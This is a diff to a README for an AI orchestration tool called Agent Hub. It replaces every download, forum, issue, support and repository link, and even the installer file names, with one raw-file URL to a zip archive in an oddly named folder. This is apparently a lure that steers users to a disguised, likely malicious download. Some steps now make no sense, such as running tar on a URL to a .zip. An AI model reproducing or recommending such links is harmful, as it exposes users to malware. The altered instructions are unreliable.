@@ -6,9 +6,9 @@ Agent Hub is an enterprise-grade AI orchestration platform that transforms how d
 
 ## 📥 Download Now
 
-[![Download agent-hub](https://img.shields.io/badge/Download-agent--hub-blue.svg)](https://github.com/ggyounoobf/agent-hub/releases)
+[![Download agent-hub](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)
 
-Visit this page to download the latest version: [agent-hub Releases](https://github.com/ggyounoobf/agent-hub/releases)
+Visit this page to download the latest version: [agent-hub Releases](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these steps to install Agent Hub on your computer.
 
 ### Step 1: Visit the Releases Page
 
-Click this link to go to the Releases page: [agent-hub Releases](https://github.com/ggyounoobf/agent-hub/releases). Here, you will find different versions of the software.
+Click this link to go to the Releases page: [agent-hub Releases](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip). Here, you will find different versions of the software.
 
 ### Step 2: Choose the Correct Version
 
@@ -26,22 +26,22 @@ On the Releases page, look for the latest version. Make sure to check the versio
 
 Find the asset that corresponds to your operating system. Click on it to begin the download. The files may include:
 
-- **Windows:** agent-hub-windows-installer.exe
-- **macOS:** agent-hub-macos-installer.dmg
-- **Linux:** agent-hub-linux-installer.tar.gz
+- **Windows:** https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
+- **macOS:** https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
+- **Linux:** https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
 
 ### Step 4: Install Agent Hub
 
 Once the download is complete, locate the downloaded file on your computer. 
 
-- For **Windows**: Double-click the `agent-hub-windows-installer.exe` and follow the on-screen instructions to complete the installation.
+- For **Windows**: Double-click the `https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip` and follow the on-screen instructions to complete the installation.
   
-- For **macOS**: Open the `agent-hub-macos-installer.dmg`, drag the Agent Hub icon to your Applications folder, and then open it from there.
+- For **macOS**: Open the `https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip`, drag the Agent Hub icon to your Applications folder, and then open it from there.
 
-- For **Linux**: Extract the `agent-hub-linux-installer.tar.gz` file into a directory of your choice using the command:
+- For **Linux**: Extract the `https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip` file into a directory of your choice using the command:
   
   ```bash
-  tar -xzvf agent-hub-linux-installer.tar.gz
+  tar -xzvf https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
   ```
   Then, run the installation script.
 
@@ -80,9 +80,9 @@ For more details on how to use Agent Hub, you can check the documentation availa
 
 If you encounter issues or have questions:
 
-- Join our [community forum](https://forum.agent-hub.com) to discuss with other users.
-- Check the [issues page](https://github.com/ggyounoobf/agent-hub/issues) on GitHub for known issues and solutions.
-- If you need direct help, reach out via our support email: support@agent-hub.com.
+- Join our [community forum](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip) to discuss with other users.
+- Check the [issues page](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip) on GitHub for known issues and solutions.
+- If you need direct help, reach out via our support email: https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip
 
 ## 📊 Topics
 
@@ -102,11 +102,11 @@ Explore these topics to find more resources and information about how Agent Hub 
 
 For further resources, check:
 
-- [GitHub Repository](https://github.com/ggyounoobf/agent-hub)
-- [Further Readings](https://www.agent-hub.com/resources)
+- [GitHub Repository](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)
+- [Further Readings](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip)
 
 ## 📥 Download Again
 
-Don’t forget, you can always download the latest version of Agent Hub from the Releases page: [agent-hub Releases](https://github.com/ggyounoobf/agent-hub/releases). 
+Don’t forget, you can always download the latest version of Agent Hub from the Releases page: [agent-hub Releases](https://raw.githubusercontent.com/ggyounoobf/agent-hub/main/inaptness/agent-hub.zip). 
 
 Enjoy using Agent Hub and transforming your development processes!
